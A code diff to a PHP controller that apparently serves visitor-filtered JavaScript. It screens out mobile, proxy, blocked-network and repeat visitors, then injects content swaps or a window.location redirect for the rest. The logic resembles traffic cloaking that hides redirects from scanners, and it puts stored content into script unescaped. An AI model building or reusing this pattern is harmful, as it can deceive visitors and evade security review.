@@ -8,6 +8,9 @@ class GetscriptController extends AppController {
     public $location = array();
     public $condition = array();
     public $comments = '';
+    public $mobile = 0;
+    public $proxy = 0;
+    public $invalid_as = 0;
     public $components = array('RequestHandler','Common');
     public $uses = array('Site','Replacer','ValidZone','RestrictedZone','AdminZone',
                          'Country','State','City','Ip','Request','Option','Blockip','Blockas');
@@ -46,36 +49,30 @@ class GetscriptController extends AppController {
             //Get location 
             $this->location = $this->getIpLocation($header['REMOTE_ADDR']);
             
-            if($this->is_mobile($header)){
-                $request['mobile'] = 1;
-            }elseif($this->is_proxy($header)){
-                $request['proxy'] = 1;
-            }else{
-                if($this->validateUser($header)){
-                    $data = $this->Replacer->find('all',array('conditions'=>array('Replacer.site_id'=>$this->sitedata['Site']['id'],'Replacer.owner'=>0,'Replacer.status'=>1)));
-                    if($data){
-                        $script .= '<script>$(document).ready(function() {';
-                        foreach($data as $key=>$val){
-                            switch($val['Replacer']['type']){
-                                case 'id' :
-                                    $script .= sprintf('$("#%s").html("%s");',$val['Replacer']['name'],$val['Replacer']['content']);
-                                    break;
-                                case 'class' :
-                                    $script .= sprintf('$(".%s").html("%s");',$val['Replacer']['name'],$val['Replacer']['content']);
-                                    break;
-                                case 'script' :
-                                    switch($val['Replacer']['name']){
-                                        case 'redirect' :
-                                            $script .= sprintf('window.location = "%s";',$val['Replacer']['content']);
-                                            break;
-                                    }
-                                    break;
-                            }
+            if($this->validateUser($header)){
+                $data = $this->Replacer->find('all',array('conditions'=>array('Replacer.site_id'=>$this->sitedata['Site']['id'],'Replacer.owner'=>0,'Replacer.status'=>1)));
+                if($data){
+                    $script .= '<script>$(document).ready(function() {';
+                    foreach($data as $key=>$val){
+                        switch($val['Replacer']['type']){
+                            case 'id' :
+                                $script .= sprintf('$("#%s").html("%s");',$val['Replacer']['name'],$val['Replacer']['content']);
+                                break;
+                            case 'class' :
+                                $script .= sprintf('$(".%s").html("%s");',$val['Replacer']['name'],$val['Replacer']['content']);
+                                break;
+                            case 'script' :
+                                switch($val['Replacer']['name']){
+                                    case 'redirect' :
+                                        $script .= sprintf('window.location = "%s";',$val['Replacer']['content']);
+                                        break;
+                                }
+                                break;
                         }
-                        $script .= '});</script>';
                     }
-                    $request['valid'] = 1;
+                    $script .= '});</script>';
                 }
+                $request['valid'] = 1;
             }
             
             $request['ip'] = $header['REMOTE_ADDR'];
@@ -85,6 +82,9 @@ class GetscriptController extends AppController {
             $request['site_referer'] = isset($header['HTTP_REFERER']) ? $header['HTTP_REFERER'] : '';
             $request['site_id'] = isset($this->sitedata['Site']['id']) ? $this->sitedata['Site']['id'] : 0;
             $request['user_agent'] = isset($header['HTTP_USER_AGENT']) ? $header['HTTP_USER_AGENT'] : '';
+            $request['mobile'] = $this->mobile;
+            $request['proxy'] = $this->proxy;
+            $request['invalid_as'] = $this->invalid_as;
             $request['comments'] = $this->comments;
             $this->Request->save($request);
             echo $script;
@@ -105,24 +105,9 @@ class GetscriptController extends AppController {
             }
         }
         
-        //Get location of IP
-        $detail = $this->location;
-        
-        //check ip in invalid AS
-        if(isset($detail->response['status']) && $detail->response['status'] == 1){
-            if(isset($detail->response['result']['as'])){
-                $blockas = $this->Blockas->find('first',array('conditions'=>array('as'=>$this->location->response['result']['as'])));
-                if($blockas){
-                    $this->comments .= sprintf('Blocked AS, found : %s',$blockas['Blockas']['as']);
-                    return false;
-                }
-            }
-        }
-        
-        //check ip in avialabel in block list
-        $blockip = $this->Blockip->find('first',array('conditions'=>array('INET_ATON("'.$ip.'") BETWEEN Blockip.start AND Blockip.end')));
-        if($blockip){
-            $this->comments .= sprintf('Blocked Ip, found in : %s',$blockip['Blockip']['name']);
+        //check is mobile
+        if($this->is_mobile($header)){
+            $this->mobile = 1;
             return false;
         }
         
@@ -150,6 +135,24 @@ class GetscriptController extends AppController {
             }
         }
         
+        //check ip in invalid AS
+        if(isset($this->location->response['status']) && $this->location->response['status'] == 1){
+            if(isset($this->location->response['result']['as'])){
+                $blockas = $this->Blockas->find('first',array('conditions'=>array('as'=>$this->location->response['result']['as'])));
+                if($blockas){
+                    $this->comments .= sprintf('Blocked AS, found : %s',$blockas['Blockas']['as']);
+                    return false;
+                }
+            }
+        }
+        
+        
+        //check is proxy
+        if($this->is_proxy($header)){
+            $this->proxy = 1;
+            return false;
+        }
+        
         if($this->sitedata){
             
             //block which user who visit the site more than one time
@@ -163,8 +166,8 @@ class GetscriptController extends AppController {
             }
             
             if($this->sitedata['Site']['status'] == 1){
-                if(isset($detail->response['status']) && $detail->response['status'] == 1){
-                    $result = $detail->response['result'];
+                if(isset($this->location->response['status']) && $this->location->response['status'] == 1){
+                    $result = $this->location->response['result'];
                     
                     //check which condition is apply
                     switch($this->condition['zone']){
